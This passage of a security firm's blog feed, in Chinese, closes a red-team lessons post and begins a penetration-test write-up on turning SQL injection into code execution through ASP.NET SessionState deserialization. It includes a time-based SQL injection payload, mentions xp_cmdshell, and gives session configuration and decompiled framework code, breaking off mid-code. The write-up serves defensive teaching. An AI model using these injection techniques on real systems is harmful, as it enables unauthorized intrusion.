  &lt;li&gt;&lt;strong&gt;利用凌晨時段竄改群組派送原則&lt;/strong&gt;：最後是回應機制未即時（包含人員接獲告警後處理不當），企業對於具有集中管理權限的重要系統，例如 AD Server、資產管理軟體等這類型的主機，除了對特權帳號高強度的管理外（如 OTP），也應該針對「異常帳號登入」、「異常帳號新增到群組」、「正常帳號異常登入時間」、「新增排程或 GPO」等行為發出告警；而各種告警也應該依照資產的重要性訂定不同的 SLA 回應與處理。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;你需要更全面目標導向的方式思考企業資安現況&quot;&gt;你需要更全面、目標導向的方式思考企業資安現況&lt;/h2&gt;

&lt;p&gt;我們在近三年的紅隊演練，以企業對其營運最關鍵的資訊資產作為演練標的，並模擬組織型駭客的攻擊模式，透過外部情搜、取得外部系統權限、橫向移動、持續取得更多內部伺服器權限及提權、破解密碼，最終達到企業指定的關鍵資產執行演練情境。而企業透過高強度且精準的演練過程，除了明確掌握可被入侵的路徑外，更得以檢視上述問題的不足並持續改善。&lt;/p&gt;

&lt;p&gt;我們認為，只要你的企業夠重要（對駭客而言重要，而不是自己覺得重要），組織型的攻擊就不會停歇！企業唯有不斷的找出自己不足之處，持續提升自己的防禦強度才是能真正降低風險的正確作法。&lt;/p&gt;

&lt;p&gt;至於「第三方供應鏈安全」及「如何更完整的制定資安策略」，我們將找時間另外跟大家說明。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers/</link>
                <guid>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers</guid>
                <pubDate>Fri, 21 Aug 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從 SQL 到 RCE: 利用 SessionState 反序列化攻擊 ASP.NET 網站應用程式</title>
                <description>&lt;p&gt;今日來聊聊在去年某次滲透測試過中發現的趣事，那是在一個風和日麗的下午，與往常一樣進行著枯燥的測試環節，對每個參數嘗試各種可能的注入，但遲遲沒有任何進展和突破，直到在某個頁面上注入 &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=1; waitfor delay &#39;00:00:05&#39;--&lt;/code&gt;，然後他就卡住了，過了恰好 5 秒鐘後伺服器又有回應，這表示我們找到一個 SQL Server 上的 SQL Injection！&lt;/p&gt;

&lt;p&gt;一些陳舊、龐大的系統中，因為一些複雜的因素，往往仍使用著 sa 帳戶來登入 SQL Server，而在有如此高權限的資料庫帳戶前提下，我們可以輕易利用 xp_cmdshell 來執行系統指令以取得資料庫伺服器的作業系統控制權，但假如故事有如此順利，就不會出現這篇文章，所以理所當然我們取得的資料庫帳戶並沒有足夠權限。但因為發現的 SQL Injection 是 Stacked based，我們仍然可以對資料表做 CRUD，運氣好控制到一些網站設定變數的話，甚至可以直接達成 RCE，所以還是試著 dump schema 以了解架構，而在 dump 過程中發現了一個有趣的資料庫：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;閱讀文件後了解到，這個資料庫的存在用途是用來保存 ASP.NET 網站應用程式的 session。一般情況下預設 session 是儲存在 ASP.NET 網站應用程式的記憶體中，但某些分散式架構（例如 Load Balance 架構）的情況下，同時會有多個一模一樣的 ASP.NET 網站應用程式運行在不同伺服器主機上，而使用者每次請求時被分配到的伺服器主機也不會完全一致，就會需要有可以讓多個主機共享 session 的機制，而儲存在 SQL Server 上就是一種解決方案之一，想啟用這個機制可以在 web.config 中添加如下設定：&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 將 session 保存在 SQL Server 中。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;sessionState&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SQLServer&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;sqlConnectionString=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data source=127.0.0.1;user id=&amp;lt;username&amp;gt;;password=&amp;lt;password&amp;gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;timeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 預設值，將 session 保存在記憶體中。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;
 
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 將 session 保存在 ASP.NET State Service 中，
             另一種跨主機共享 session 的解決方案。 --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
        &amp;lt;sessionState
            mode=&quot;StateServer&quot;
            stateConnectionString=&quot;tcpip=localhost:42424&quot;
            timeout=&quot;20&quot;
        /&amp;gt;
        --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而要在資料庫中建立 ASPState 的資料庫，可以利用內建的工具 &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe&lt;/code&gt; 完成這個任務，只需要使用下述指令即可：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 建立 ASPState 資料庫&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssadd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p

&lt;span class=&quot;c&quot;&gt;# 移除 ASPState 資料庫&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssremove&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;現在我們了解如何設定 session 的儲存位置，且又可以控制 ASPState 資料庫，可以做到些什麼呢？這就是文章標題的重點，取得 Remote Code Execution！&lt;/p&gt;

&lt;p&gt;ASP.NET 允許我們在 session 中儲存一些物件，例如儲存一個 List 物件：&lt;code class=&quot;highlighter-rouge&quot;&gt;Session[&quot;secret&quot;] = new List&amp;lt;String&amp;gt;() { &quot;secret string&quot; };&lt;/code&gt;，對於如何將這些物件保存到 SQL Server 上，理所當然地使用了&lt;strong&gt;序列化機制&lt;/strong&gt;來處理，而我們又控制了資料庫，所以也能執行任意反序列化，為此需要先了解 Session 物件序列化與反序列化的過程。&lt;/p&gt;

&lt;p&gt;簡單閱讀程式碼後，很快就可以定位出處理相關過程的類別，為了縮減說明的篇幅，以下將直接切入重點說明從資料庫取出資料後進行了什麼樣的反序列化操作。核心主要是透過呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;SqlSessionStateStore.GetItem&lt;/code&gt; 函式還原出 Session 物件，雖然已盡可能把無關緊要的程式碼移除，但行數還是偏多，如果懶得閱讀程式碼的朋友可以直接下拉繼續看文章說明 XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlSessionStateStore&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreProviderBase&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;GetItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionIDManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CheckIdLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* throwOnFail */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlDataReader&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MemoryStream&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlStateConnection&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGetExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_partitionInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AppSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @id&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @itemShort&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @locked&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockDate or @lockAge&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockCookie&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @actionFlags&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlExecuteReaderWithRetry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;nf&quot;&gt;ThrowSqlConnectionException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;cm&quot;&gt;/* Get short item */&lt;/span&gt;
